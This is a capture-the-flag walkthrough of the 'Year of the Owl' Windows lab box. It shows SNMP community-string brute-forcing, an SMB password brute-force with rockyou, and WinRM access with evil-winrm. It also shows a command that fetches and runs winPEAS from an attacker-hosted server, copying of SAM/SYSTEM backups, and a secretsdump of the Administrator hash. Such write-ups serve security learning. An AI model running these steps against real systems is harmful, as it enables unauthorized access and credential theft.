

# PORT SCAN
---

| **PORT**   | **SERVICE**       |
|------------|-------------------|
| 80/tcp     | http              |
| 139/tcp    | netbios-ssn       |
| 443/tcp    | ssl/http          |
| 445/tcp    | microsoft-ds?     |
| 3306/tcp   | mysql             |
| 3389/tcp   | ms-wbt-server     |
| 5985/tcp   | http              |
| 47001/tcp  | http              |


# RECONNAISSANCE
---

Let's analyze both web applications:

![Pasted image 20250725142923.png](../../IMAGES/Pasted%20image%2020250725142923.png)

Both web applications only contain this image of an owl, I tried `steghide` on the image but nothing can be found, if we fuzz, nothing can be found either:

```bash
ffuf -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u "http://10.10.222.90/FUZZ" -ic -c -t 200 -e .php,.html,.txt,.git,.js

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://10.10.222.90/FUZZ
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt
 :: Extensions       : .php .html .txt .git .js
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 200
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

.html                   [Status: 403, Size: 302, Words: 22, Lines: 10, Duration: 233ms]
                        [Status: 200, Size: 252, Words: 12, Lines: 12, Duration: 233ms]
index.php               [Status: 200, Size: 252, Words: 12, Lines: 12, Duration: 245ms]
```


```bash
ffuf -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u "https://10.10.222.90/FUZZ" -ic -c -t 200 -e .php,.html,.txt,.git,.js

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : https://10.10.222.90/FUZZ
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt
 :: Extensions       : .php .html .txt .git .js
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 200
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

.html                   [Status: 403, Size: 303, Words: 22, Lines: 10, Duration: 247ms]
                        [Status: 200, Size: 252, Words: 12, Lines: 12, Duration: 247ms]
index.php               [Status: 200, Size: 252, Words: 12, Lines: 12, Duration: 247ms]
Index.php               [Status: 200, Size: 252, Words: 12, Lines: 12, Duration: 231ms]
licenses                [Status: 403, Size: 422, Words: 37, Lines: 12, Duration: 245ms]
```

Smb anonymous login isn't enabled too:

```bash
smbclient -L //10.10.222.90 -N
session setup failed: NT_STATUS_ACCESS_DENIED
```

We're in a bit of a tight situation, the creator of the box tells us we need to think outside of the box, we've only done a port scan for `tcp`, what about `udp`?

Let's scan the ports once again:

```bash
sudo nmap -sU -Pn -p 53,67,68,69,123,137,138,161,162,500,514,520,623,631,1434,1900,4500,5353,8008 -vv 10.10.222.90

Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-25 20:15 EDT
Initiating Parallel DNS resolution of 1 host. at 20:15
Completed Parallel DNS resolution of 1 host. at 20:15, 0.01s elapsed
Initiating UDP Scan at 20:15
Scanning 10.10.222.90 [19 ports]
Completed UDP Scan at 20:15, 5.11s elapsed (19 total ports)
Nmap scan report for 10.10.222.90
Host is up, received user-set.
Scanned at 2025-07-25 20:15:13 EDT for 5s

PORT     STATE         SERVICE     REASON
53/udp   open|filtered domain      no-response
67/udp   open|filtered dhcps       no-response
68/udp   open|filtered dhcpc       no-response
69/udp   open|filtered tftp        no-response
123/udp  open|filtered ntp         no-response
137/udp  open|filtered netbios-ns  no-response
138/udp  open|filtered netbios-dgm no-response
161/udp  open|filtered snmp        no-response
162/udp  open|filtered snmptrap    no-response
500/udp  open|filtered isakmp      no-response
514/udp  open|filtered syslog      no-response
520/udp  open|filtered route       no-response
623/udp  open|filtered asf-rmcp    no-response
631/udp  open|filtered ipp         no-response
1434/udp open|filtered ms-sql-m    no-response
1900/udp open|filtered upnp        no-response
4500/udp open|filtered nat-t-ike   no-response
5353/udp open|filtered zeroconf    no-response
8008/udp open|filtered http-alt    no-response
```


We got a lot of `open|filtered` ports on here, we can see `snmp` has this state, let's try using a tool to probe if the port is open, we can use `onesixtyone`, `onesixtyone` is a lightning-fast SNMP scanner that helps us identifying SNMP enabled devices, we need to provide a community string for the tool to work, since we don't know the community string, we can brute force it.

A community string in SNMP (v1/v2c) is a plaintext token used to authenticate access to SNMP data on a device. It works like a simple password, with common defaults such as `public` for read-only access and `private` for read-write access. If the correct string is provided, tools like `snmpwalk` or `onesixtyone` can retrieve or modify information from the device. Misconfigured or default community strings often expose sensitive network data and are a common target during enumeration.

You can check more info on SNMP pentesting on the article below:

https://www.poplabsec.com/snmp-pentesting/

Let's use `onesixtyone` with a wordlist from `seclists`:

```bash
onesixtyone 10.10.222.90 -c /usr/share/seclists/Discovery/SNMP/snmp-onesixtyone.txt
Scanning 1 hosts, 3218 communities

10.10.222.90 [openview] Hardware: Intel64 Family 6 Model 79 Stepping 1 AT/AT 
COMPATIBLE - Software: Windows Version 6.3 (Build 17763 Multiprocessor Free)
```

We found the community string:

```
openview
```

Now, let's use `snmp-check` with the community string to enumerate all the info on this service:

```bash
snmp-check 10.10.222.90 -c openview
snmp-check v1.9 - SNMP enumerator
Copyright (c) 2005-2015 by Matteo Cantoni (www.nothink.org)

[+] Try to connect to 10.10.222.90:161 using SNMPv1 and community 'openview'

[*] System information:

  Host IP address               : 10.10.222.90
  Hostname                      : year-of-the-owl
  Description                   : Hardware: Intel64 Family 6 Model 79 Stepping 1 AT/AT COMPATIBLE - Software: Windows Version 6.3 (Build 17763 Multiprocessor Free)
  Contact                       : -
  Location                      : -
  Uptime snmp                   : 00:52:51.81
  Uptime system                 : 00:52:05.15
  System date                   : 2025-7-25 19:05:29.2
  Domain                        : WORKGROUP

[*] User accounts:

  Guest               
  Jareth              
  Administrator       
  DefaultAccount      
  WDAGUtilityAccount  

[*] Network information:

  IP forwarding enabled         : no
  Default TTL                   : 128
  TCP segments received         : 519138
  TCP segments sent             : 344439
  TCP segments retrans          : 958
  Input datagrams               : 531245
  Delivered datagrams           : 522852
  Output datagrams              : 345086

[*] Network interfaces:

  Interface                     : [ up ] Software Loopback Interface 1
  Id                            : 1
  Mac Address                   : :::::
  Type                          : softwareLoopback
  Speed                         : 1073 Mbps
  MTU                           : 1500
  In octets                     : 0
  Out octets                    : 0

  Interface                     : [ down ] Microsoft 6to4 Adapter
  Id                            : 2
  Mac Address                   : :::::
  Type                          : unknown
  Speed                         : 0 Mbps
  MTU                           : 0
  In octets                     : 0
  Out octets                    : 0

  Interface                     : [ down ] Microsoft IP-HTTPS Platform Adapter
  Id                            : 3
  Mac Address                   : :::::
  Type                          : unknown
  Speed                         : 0 Mbps
  MTU                           : 0
  In octets                     : 0
  Out octets                    : 0

  Interface                     : [ down ] Microsoft Kernel Debug Network Adapter
  Id                            : 4
  Mac Address                   : :::::
  Type                          : ethernet-csmacd
  Speed                         : 0 Mbps
  MTU                           : 0
  In octets                     : 0
  Out octets                    : 0

  Interface                     : [ down ] Intel(R) 82574L Gigabit Network Connection
  Id                            : 5
  Mac Address                   : 00:0c:29:02:45:89
  Type                          : ethernet-csmacd
  Speed                         : 0 Mbps
  MTU                           : 0
  In octets                     : 0
  Out octets                    : 0

  Interface                     : [ down ] Microsoft Teredo Tunneling Adapter
  Id                            : 6
  Mac Address                   : :::::
  Type                          : unknown
  Speed                         : 0 Mbps
  MTU                           : 0
  In octets                     : 0
  Out octets                    : 0

  Interface                     : [ up ] AWS PV Network Device #0
  Id                            : 7
  Mac Address                   : 02:89:10:67:0c:c7
  Type                          : ethernet-csmacd
  Speed                         : 1000 Mbps
  MTU                           : 9001
  In octets                     : 70984696
  Out octets                    : 169070963

  Interface                     : [ up ] AWS PV Network Device #0-WFP Native MAC Layer LightWeight Filter-0000
  Id                            : 8
  Mac Address                   : 02:89:10:67:0c:c7
  Type                          : ethernet-csmacd
  Speed                         : 1000 Mbps
  MTU                           : 9001
  In octets                     : 70984696
  Out octets                    : 169070963

  Interface                     : [ up ] AWS PV Network Device #0-QoS Packet Scheduler-0000
  Id                            : 9
  Mac Address                   : 02:89:10:67:0c:c7
  Type                          : ethernet-csmacd
  Speed                         : 1000 Mbps
  MTU                           : 9001
  In octets                     : 70984696
  Out octets                    : 169070963

  Interface                     : [ up ] AWS PV Network Device #0-WFP 802.3 MAC Layer LightWeight Filter-0000
  Id                            : 10
  Mac Address                   : 02:89:10:67:0c:c7
  Type                          : ethernet-csmacd
  Speed                         : 1000 Mbps
  MTU                           : 9001
  In octets                     : 70984696
  Out octets                    : 169070963


[*] Network IP:

  Id                    IP Address            Netmask               Broadcast           
  7                     10.10.222.90          255.255.0.0           1                   
  1                     127.0.0.1             255.0.0.0             1                   

[*] Routing information:

  Destination           Next hop              Mask                  Metric              
  0.0.0.0               10.10.0.1             0.0.0.0               25                  
  10.10.0.0             10.10.222.90          255.255.0.0           281                 
  10.10.222.90          10.10.222.90          255.255.255.255       281                 
  10.10.255.255         10.10.222.90          255.255.255.255       281                 
  127.0.0.0             127.0.0.1             255.0.0.0             331                 
  127.0.0.1             127.0.0.1             255.255.255.255       331                 
  127.255.255.255       127.0.0.1             255.255.255.255       331                 
  169.254.169.123       10.10.0.1             255.255.255.255       50                  
  169.254.169.249       10.10.0.1             255.255.255.255       50                  
  169.254.169.250       10.10.0.1             255.255.255.255       50                  
  169.254.169.251       10.10.0.1             255.255.255.255       50                  
  169.254.169.253       10.10.0.1             255.255.255.255       50                  
  169.254.169.254       10.10.0.1             255.255.255.255       50                  
  224.0.0.0             127.0.0.1             240.0.0.0             331                 
  255.255.255.255       127.0.0.1             255.255.255.255       331                 

[*] TCP connections and listening ports:

  Local address         Local port            Remote address        Remote port           State               
  0.0.0.0               80                    0.0.0.0               0                     listen              
  0.0.0.0               135                   0.0.0.0               0                     listen              
  0.0.0.0               443                   0.0.0.0               0                     listen              
  0.0.0.0               445                   0.0.0.0               0                     listen              
  0.0.0.0               3306                  0.0.0.0               0                     listen              
  0.0.0.0               3389                  0.0.0.0               0                     listen              
  0.0.0.0               5985                  0.0.0.0               0                     listen              
  0.0.0.0               47001                 0.0.0.0               0                     listen              
  0.0.0.0               49664                 0.0.0.0               0                     listen              
  0.0.0.0               49665                 0.0.0.0               0                     listen              
  0.0.0.0               49666                 0.0.0.0               0                     listen              
  0.0.0.0               49667                 0.0.0.0               0                     listen              
  0.0.0.0               49668                 0.0.0.0               0                     listen              
  0.0.0.0               49669                 0.0.0.0               0                     listen              
  10.10.222.90          139                   0.0.0.0               0                     listen              
  10.10.222.90          49866                 217.20.56.100         80                    synSent             

[*] Listening UDP ports:

  Local address         Local port          
  0.0.0.0               123                 
  0.0.0.0               161                 
  0.0.0.0               3389                
  0.0.0.0               5353                
  0.0.0.0               5355                
  10.10.222.90          137                 
  10.10.222.90          138                 
  127.0.0.1             52888               

[*] Network services:

  Index                 Name                
  0                     Power               
  1                     mysql               
  2                     Server              
  3                     Themes              
  4                     SysMain             
  5                     Apache2.4           
  6                     IP Helper           
  7                     DNS Client          
  8                     DHCP Client         
  9                     Time Broker         
  10                    Workstation         
  11                    SNMP Service        
  12                    User Manager        
  13                    Windows Time        
  14                    CoreMessaging       
  15                    Plug and Play       
  16                    Print Spooler       
  17                    Task Scheduler      
  18                    Windows Update      
  19                    Amazon SSM Agent    
  20                    CNG Key Isolation   
  21                    COM+ Event System   
  22                    Windows Event Log   
  23                    IPsec Policy Agent  
  24                    Group Policy Client 
  25                    RPC Endpoint Mapper 
  26                    Web Account Manager 
  27                    AWS Lite Guest Agent
  28                    Data Sharing Service
  29                    Device Setup Manager
  30                    Network List Service
  31                    System Events Broker
  32                    User Profile Service
  33                    Base Filtering Engine
  34                    Local Session Manager
  35                    TCP/IP NetBIOS Helper
  36                    Cryptographic Services
  37                    Application Information
  38                    Certificate Propagation
  39                    Remote Desktop Services
  40                    Shell Hardware Detection
  41                    Diagnostic Policy Service
  42                    Network Connection Broker
  43                    Security Accounts Manager
  44                    Windows Defender Firewall
  45                    Windows Modules Installer
  46                    Network Location Awareness
  47                    Windows Connection Manager
  48                    Windows Font Cache Service
  49                    Remote Procedure Call (RPC)
  50                    Update Orchestrator Service
  51                    User Access Logging Service
  52                    DCOM Server Process Launcher
  53                    Remote Desktop Configuration
  54                    Network Store Interface Service
  55                    Distributed Link Tracking Client
  56                    AppX Deployment Service (AppXSVC)
  57                    System Event Notification Service
  58                    Connected Devices Platform Service
  59                    Windows Defender Antivirus Service
  60                    Windows Management Instrumentation
  61                    Distributed Transaction Coordinator
  62                    Background Tasks Infrastructure Service
  63                    Connected User Experiences and Telemetry
  64                    WinHTTP Web Proxy Auto-Discovery Service
  65                    Windows Push Notifications System Service
  66                    Windows Remote Management (WS-Management)
  67                    Remote Desktop Services UserMode Port Redirector
  68                    Windows Defender Antivirus Network Inspection Service

[*] Processes:

  Id                    Status                Name                  Path                  Parameters          
  1                     running               System Idle Process                                             
  4                     running               System                                                          
  68                    running               Registry                                                        
  412                   running               smss.exe                                                        
  528                   running               dwm.exe                                                         
  564                   running               csrss.exe                                                       
  628                   running               svchost.exe           C:\Windows\system32\  -k netsvcs -p       
  636                   running               csrss.exe                                                       
  652                   running               wininit.exe                                                     
  692                   running               winlogon.exe                                                    
  756                   running               services.exe                                                    
  772                   running               lsass.exe             C:\Windows\system32\                      
  792                   running               CompatTelRunner.exe   C:\Windows\system32\  -maintenance        
  840                   running               svchost.exe           C:\Windows\System32\  -k termsvcs         
  876                   running               svchost.exe           C:\Windows\system32\  -k DcomLaunch -p    
  888                   running               svchost.exe           C:\Windows\System32\  -k LocalSystemNetworkRestricted -p
  900                   running               fontdrvhost.exe                                                 
  908                   running               fontdrvhost.exe                                                 
  972                   running               svchost.exe           C:\Windows\system32\  -k RPCSS -p         
  1020                  running               svchost.exe           C:\Windows\System32\  -k LocalServiceNetworkRestricted -p
  1208                  running               svchost.exe           C:\Windows\system32\  -k LocalService -p  
  1244                  running               httpd.exe             C:\xampp\apache\bin\  -k runservice       
  1284                  running               svchost.exe           C:\Windows\System32\  -k NetworkService -p
  1312                  running               svchost.exe           C:\Windows\system32\  -k LocalServiceNetworkRestricted -p
  1428                  running               svchost.exe           C:\Windows\system32\  -k LocalServiceNoNetworkFirewall -p
  1496                  running               svchost.exe           C:\Windows\system32\  -k LocalServiceNoNetwork -p
  1548                  running               taskhostw.exe                               /RuntimeWide        
  1636                  running               mysqld.exe            C:\xampp\mysql\bin\   --defaults-file=c:\xampp\mysql\bin\my.ini mysql
  1760                  running               svchost.exe           C:\Windows\system32\  -k netsvcs          
  1776                  running               conhost.exe           \??\C:\Windows\system32\  0x4                 
  1828                  running               spoolsv.exe           C:\Windows\System32\                      
  1856                  running               conhost.exe           \??\C:\Windows\system32\  0x4                 
  1860                  running               svchost.exe           C:\Windows\System32\  -k utcsvc -p        
  1908                  running               msdtc.exe             C:\Windows\System32\                      
  1936                  running               svchost.exe           C:\Windows\System32\  -k smbsvcs          
  1948                  running               svchost.exe           C:\Windows\system32\  -k LocalService     
  1980                  running               LiteAgent.exe         C:\Program Files\Amazon\XenTools\                      
  1988                  running               MsMpEng.exe                                                     
  1996                  running               snmp.exe              C:\Windows\System32\                      
  2020                  running               amazon-ssm-agent.exe  C:\Program Files\Amazon\SSM\                      
  2084                  running               CompatTelRunner.exe   C:\Windows\system32\  -m:appraiser.dll -f:DoScheduledTelemetryRun -cv:9e/Lmy/kE0eUBggC.2
  2248                  running               svchost.exe           C:\Windows\system32\  -k NetworkServiceNetworkRestricted -p
  2896                  running               LogonUI.exe                                 /flags:0x2 /state0:0xa3a7c855 /state1:0x41c64e6d
  2944                  running               httpd.exe             C:\xampp\apache\bin\  -d C:/xampp/apache  
  3540                  running               conhost.exe           \??\C:\Windows\system32\  0x4                 
  3660                  running               mscorsvw.exe          C:\Windows\Microsoft.NET\Framework64\v4.0.30319\  -StartupEvent 19c -InterruptEvent 0 -NGENProcess 290 -Pipe 2b4 -Comment "NGen Worker Process"
  3716                  running               TrustedInstaller.exe  C:\Windows\servicing\                      
  3888                  running               WmiPrvSE.exe          C:\Windows\system32\wbem\                      
  3900                  running               ngentask.exe          C:\Windows\Microsoft.NET\Framework64\v4.0.30319\  /RuntimeWide /StopEvent:1032
  3980                  running               NisSrv.exe                                                      
  4392                  running               ngen.exe              C:\Windows\Microsoft.NET\Framework64\v4.0.30319\  ExecuteQueuedItems /LegacyServiceBehavior
  4588                  running               ngentask.exe          C:\Windows\Microsoft.NET\Framework\v4.0.30319\  /RuntimeWide /StopEvent:1044
  4596                  running               TiWorker.exe          C:\Windows\winsxs\amd64_microsoft-windows-servicingstack_31bf3856ad364e35_10.0.17763.1450_none_56e6965b991df4af\  -Embedding          
  4736                  running               ngen.exe              C:\Windows\Microsoft.NET\Framework\v4.0.30319\  ExecuteQueuedItems /LegacyServiceBehavior

[*] Storage information:

  Description                   : ["C:\\ Label:  Serial Number 7c0c3814"]
  Device id                     : [#<SNMP::Integer:0x00007fb061247bb0 @value=1>]
  Filesystem type               : ["unknown"]
  Device unit                   : [#<SNMP::Integer:0x00007fb061245ef0 @value=4096>]
  Memory size                   : 19.46 GB
  Memory used                   : 15.63 GB

  Description                   : ["Virtual Memory"]
  Device id                     : [#<SNMP::Integer:0x00007fb061240dd8 @value=2>]
  Filesystem type               : ["unknown"]
  Device unit                   : [#<SNMP::Integer:0x00007fb06141b608 @value=65536>]
  Memory size                   : 3.12 GB
  Memory used                   : 1.76 GB

  Description                   : ["Physical Memory"]
  Device id                     : [#<SNMP::Integer:0x00007fb06120e400 @value=3>]
  Filesystem type               : ["unknown"]
  Device unit                   : [#<SNMP::Integer:0x00007fb06120c858 @value=65536>]
  Memory size                   : 2.00 GB
  Memory used                   : 1.46 GB


[*] File system information:

  Index                         : 1
  Mount point                   : 
  Remote mount point            : -
  Access                        : 1
  Bootable                      : 0

[*] Device information:

  Id                    Type                  Status                Descr               
  1                     unknown               running               Microsoft XPS Document Writer v4
  2                     unknown               running               Microsoft Print To PDF
  3                     unknown               running               Unknown Processor Type
  4                     unknown               unknown               Software Loopback Interface 1
  5                     unknown               unknown               Microsoft 6to4 Adapter
  6                     unknown               unknown               Microsoft IP-HTTPS Platform Adapter
  7                     unknown               unknown               Microsoft Kernel Debug Network Adapter
  8                     unknown               unknown               Intel(R) 82574L Gigabit Network Connection
  9                     unknown               unknown               Microsoft Teredo Tunneling Adapter
  10                    unknown               unknown               AWS PV Network Device #0
  11                    unknown               unknown               AWS PV Network Device #0-WFP Native MAC Layer LightWeight Filter
  12                    unknown               unknown               AWS PV Network Device #0-QoS Packet Scheduler-0000
  13                    unknown               unknown               AWS PV Network Device #0-WFP 802.3 MAC Layer LightWeight Filter-
  14                    unknown               running               Fixed Disk          
  15                    unknown               running               Fixed Disk          
  16                    unknown               running               IBM enhanced (101- or 102-key) keyboard, Subtype=(0)
  17                    unknown               unknown               COM1:               

[*] Software components:

  Index                 Name                
  1                     XAMPP               
  2                     Microsoft Visual C++ 2017 x64 Minimum Runtime - 14.11.25325
  3                     Microsoft Visual C++ 2017 x64 Additional Runtime - 14.11.25325
  4                     Amazon SSM Agent    
  5                     Amazon SSM Agent    
  6                     Microsoft Visual C++ 2017 Redistributable (x64) - 14.11.25325
```

We can see a lot of stuff, for example, we find an user inside of here:

```bash
[*] User accounts:

  Guest               
  Jareth              
  Administrator       
  DefaultAccount      
  WDAGUtilityAccount  
```

We can also notice that antivirus may be enabled on here and we can also find `Print Spooler`, `PrintNightmare` may be the path on PE, let's save that info for now:

```powershell
[*] Network services:

  Index                 Name                
  0                     Power               
  1                     mysql               
  2                     Server              
  3                     Themes              
  4                     SysMain             
  5                     Apache2.4           
  6                     IP Helper           
  7                     DNS Client          
  8                     DHCP Client         
  9                     Time Broker         
  10                    Workstation         
  11                    SNMP Service        
  12                    User Manager        
  13                    Windows Time        
  14                    CoreMessaging       
  15                    Plug and Play       
  16                    Print Spooler       
  17                    Task Scheduler      
  18                    Windows Update      
  19                    Amazon SSM Agent    
  20                    CNG Key Isolation   
  21                    COM+ Event System   
  22                    Windows Event Log   
  23                    IPsec Policy Agent  
  24                    Group Policy Client 
  25                    RPC Endpoint Mapper 
  26                    Web Account Manager 
  27                    AWS Lite Guest Agent
  28                    Data Sharing Service
  29                    Device Setup Manager
  30                    Network List Service
  31                    System Events Broker
  32                    User Profile Service
  33                    Base Filtering Engine
  34                    Local Session Manager
  35                    TCP/IP NetBIOS Helper
  36                    Cryptographic Services
  37                    Application Information
  38                    Certificate Propagation
  39                    Remote Desktop Services
  40                    Shell Hardware Detection
  41                    Diagnostic Policy Service
  42                    Network Connection Broker
  43                    Security Accounts Manager
  44                    Windows Defender Firewall
  45                    Windows Modules Installer
  46                    Network Location Awareness
  47                    Windows Connection Manager
  48                    Windows Font Cache Service
  49                    Remote Procedure Call (RPC)
  50                    Update Orchestrator Service
  51                    User Access Logging Service
  52                    DCOM Server Process Launcher
  53                    Remote Desktop Configuration
  54                    Network Store Interface Service
  55                    Distributed Link Tracking Client
  56                    AppX Deployment Service (AppXSVC)
  57                    System Event Notification Service
  58                    Connected Devices Platform Service
  59                    Windows Defender Antivirus Service
  60                    Windows Management Instrumentation
  61                    Distributed Transaction Coordinator
  62                    Background Tasks Infrastructure Service
  63                    Connected User Experiences and Telemetry
  64                    WinHTTP Web Proxy Auto-Discovery Service
  65                    Windows Push Notifications System Service
  66                    Windows Remote Management (WS-Management)
  67                    Remote Desktop Services UserMode Port Redirector
  68                    Windows Defender Antivirus Network Inspection Service
```

Since we already got our initial username:

```
Jareth
```

We can begin exploitation and try to brute force this user with netexec.


# EXPLOITATION
---

Let's brute force `smb` using `netexec` this will take a while so, let's wait until the task finishes:

```bash
nxc smb 10.10.222.90 -u Jareth -p /usr/share/wordlists/rockyou.txt --ignore-pw-decoding

SMB         10.10.222.90    445    YEAR-OF-THE-OWL  [-] year-of-the-owl\Jareth:cutiepie STATUS_LOGON_FAILURE 
SMB         10.10.222.90    445    YEAR-OF-THE-OWL  [-] year-of-the-owl\Jareth:monkey1 STATUS_LOGON_FAILURE 
SMB         10.10.222.90    445    YEAR-OF-THE-OWL  [-] year-of-the-owl\Jareth:50cent STATUS_LOGON_FAILURE 
SMB         10.10.222.90    445    YEAR-OF-THE-OWL  [-] year-of-the-owl\Jareth:bonita STATUS_LOGON_FAILURE 
SMB         10.10.222.90    445    YEAR-OF-THE-OWL  [-] year-of-the-owl\Jareth:kevin STATUS_LOGON_FAILURE 
SMB         10.10.222.90    445    YEAR-OF-THE-OWL  [-] year-of-the-owl\Jareth:bitch STATUS_LOGON_FAILURE 
SMB         10.10.222.90    445    YEAR-OF-THE-OWL  [-] year-of-the-owl\Jareth:maganda STATUS_LOGON_FAILURE 
SMB         10.10.222.90    445    YEAR-OF-THE-OWL  [-] year-of-the-owl\Jareth:babyboy STATUS_LOGON_FAILURE 
SMB         10.10.222.90    445    YEAR-OF-THE-OWL  [-] year-of-the-owl\Jareth:casper STATUS_LOGON_FAILURE 
SMB         10.10.222.90    445    YEAR-OF-THE-OWL  [-] year-of-the-owl\Jareth:brenda STATUS_LOGON_FAILURE 
SMB         10.10.222.90    445    YEAR-OF-THE-OWL  [-] year-of-the-owl\Jareth:adidas STATUS_LOGON_FAILURE 
SMB         10.10.222.90    445    YEAR-OF-THE-OWL  [-] year-of-the-owl\Jareth:kitten STATUS_LOGON_FAILURE 
SMB         10.10.222.90    445    YEAR-OF-THE-OWL  [-] year-of-the-owl\Jareth:karen STATUS_LOGON_FAILURE 
SMB         10.10.222.90    445    YEAR-OF-THE-OWL  [-] year-of-the-owl\Jareth:mustang STATUS_LOGON_FAILURE 
SMB         10.10.222.90    445    YEAR-OF-THE-OWL  [-] year-of-the-owl\Jareth:isabel STATUS_LOGON_FAILURE 
SMB         10.10.222.90    445    YEAR-OF-THE-OWL  [-] year-of-the-owl\Jareth:natalie STATUS_LOGON_FAILURE 
SMB         10.10.222.90    445    YEAR-OF-THE-OWL  [-] year-of-the-owl\Jareth:cuteako STATUS_LOGON_FAILURE 
SMB         10.10.222.90    445    YEAR-OF-THE-OWL  [-] year-of-the-owl\Jareth:javier STATUS_LOGON_FAILURE 
SMB         10.10.222.90    445    YEAR-OF-THE-OWL  [-] year-of-the-owl\Jareth:789456123 STATUS_LOGON_FAILURE 
SMB         10.10.222.90    445    YEAR-OF-THE-OWL  [-] year-of-the-owl\Jareth:123654 STATUS_LOGON_FAILURE 
SMB         10.10.222.90    445    YEAR-OF-THE-OWL  [+] year-of-the-owl\Jareth:sarah
```

We get a match after a couple minutes:

```
Jareth / sarah
```

Let's enumerate the shares:

```
nxc smb 10.10.222.90 -u Jareth -p sarah --shares

SMB         10.10.222.90    445    YEAR-OF-THE-OWL  [*] Windows 10 / Server 2019 Build 17763 (name:YEAR-OF-THE-OWL) (domain:year-of-the-owl) (signing:False) (SMBv1:False) 
SMB         10.10.222.90    445    YEAR-OF-THE-OWL  [+] year-of-the-owl\Jareth:sarah 
SMB         10.10.222.90    445    YEAR-OF-THE-OWL  [*] Enumerated shares
SMB         10.10.222.90    445    YEAR-OF-THE-OWL  Share           Permissions     Remark
SMB         10.10.222.90    445    YEAR-OF-THE-OWL  -----           -----------     ------
SMB         10.10.222.90    445    YEAR-OF-THE-OWL  ADMIN$                          Remote Admin
SMB         10.10.222.90    445    YEAR-OF-THE-OWL  C$                              Default share
SMB         10.10.222.90    445    YEAR-OF-THE-OWL  IPC$            READ            Remote IPC
```

Nothing interesting, let's try checking if we got `winrm` access:

```bash
nxc winrm 10.10.222.90 -u Jareth -p sarah

WINRM       10.10.222.90    5985   YEAR-OF-THE-OWL  [*] Windows 10 / Server 2019 
WINRM       10.10.222.90    5985   YEAR-OF-THE-OWL  [+] year-of-the-owl\Jareth:sarah (Pwn3d!)
```

There we go, we can access `winrm` with these, we're unable to use bloodhound here due to the DNS resolution on the box, we need to do manual enumeration in order to perform PE, let's go into `evil-winrm` and begin PE:

```
evil-winrm -i 10.10.222.90 -u Jareth -p 'sarah'
```

![Pasted image 20250725142947.png](../../IMAGES/Pasted%20image%2020250725142947.png)



# PRIVILEGE ESCALATION
---

Since we need to do manual enumeration, let's try using `winpeas`:

```powershell
iwr http://IP:8000/winPEAS.ps1 -O winPEAS.ps1 # Make sure to host winpeas on a python server

# Once you got the file:

. .\winPEAS.ps1
```

Note: The script may freeze at `Checking the Sytem Registry`, if it stops, you can delete this section on `winPEAS.ps1` and then upload the file once again, this way, the scan won't freeze.

We can  notice this on the scan:

![Pasted image 20250725142956.png](../../IMAGES/Pasted%20image%2020250725142956.png)

```
=========||  Password Check in Files/Folders
=========|| Password Check. Starting at root of each drive. This will take some time. Like, grab a coffee or tea kinda time.
=========|| Looking through each drive, searching for *.xml *.txt *.conf *.config *.cfg *.ini .y*ml *.log *.bak *.xls *.xlsx *.xlsm
Possible Password found: Config Secrets (Passwd / Credentials)
C:\$Recycle.Bin\S-1-5-21-1987495829-1628902820-919763334-1001\sam.bak
C:\$Recycle.Bin\S-1-5-21-1987495829-1628902820-919763334-1001\system.bak
```

We notice there's a `sam.bak` and `system.bak` (`system.bak` appears a little later on the scan) inside of the recycle bin of our user, we can know this is our user by checking the SID with the following command:

```powershell
whoami /all | Select-String -Pattern "jareth" -Context 2,0

 User Name              SID
  ====================== =============================================
> year-of-the-owl\jareth S-1-5-21-1987495829-1628902820-919763334-1001
```

Since the files are inside of our recycle bin, we need to copy them to a temporary location and then we can get them on our machine to use `secretsdump` and get the administrator hash, to be honest, an effortless privilege escalation on this box:

```powershell
*Evil-WinRM* PS C:\Users\Jareth\Documents> dir 'C:\$Recycle.Bin\S-1-5-21-1987495829-1628902820-919763334-1001\'


    Directory: C:\$Recycle.Bin\S-1-5-21-1987495829-1628902820-919763334-1001


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        9/18/2020   7:28 PM          49152 sam.bak
-a----        9/18/2020   7:28 PM       17457152 system.bak
```


```powershell
mkdir C:\Temp

copy 'C:\$Recycle.Bin\S-1-5-21-1987495829-1628902820-919763334-1001\sam.bak' 'C:\Temp\sam.bak'

copy 'C:\$Recycle.Bin\S-1-5-21-1987495829-1628902820-919763334-1001\system.bak' 'C:\Temp\system.bak'
```

If we check our temporary directory:

```powershell
*Evil-WinRM* PS C:\Users\Jareth\Documents> dir C:\Temp


    Directory: C:\Temp


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        9/18/2020   7:28 PM          49152 sam.bak
-a----        9/18/2020   7:28 PM       17457152 system.bak
```

There we got our files, time to download them and use secretsdump:

```powershell
download 'C:\Temp\sam.bak'
download 'C:\Temp\system.bak'
```

Once both files have downloaded, we can use the tool and retrieve the hashes:

```python
impacket-secretsdump -sam sam.bak -system system.bak LOCAL
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Target system bootKey: 0xd676472afd9cc13ac271e26890b87a8c
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:6bc99ede9edcfecf9662fb0c0ddcfa7a:::
